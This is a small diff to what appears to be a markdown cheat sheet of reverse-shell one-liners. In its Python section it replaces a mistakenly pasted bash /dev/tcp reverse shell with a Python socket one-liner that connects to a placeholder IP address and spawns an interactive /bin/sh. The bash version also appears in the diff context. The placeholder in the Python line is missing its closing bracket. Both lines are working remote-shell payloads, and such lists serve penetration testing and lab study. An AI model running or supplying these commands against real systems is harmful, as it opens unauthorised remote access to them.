@@ -19,7 +19,7 @@ bash -i >& /dev/tcp/<IP-address>/8080 0>&1
 > Python
 
 ```bash
-bash -i >& /dev/tcp/<IP-address>/8080 0>&1
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-address",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 > Perl
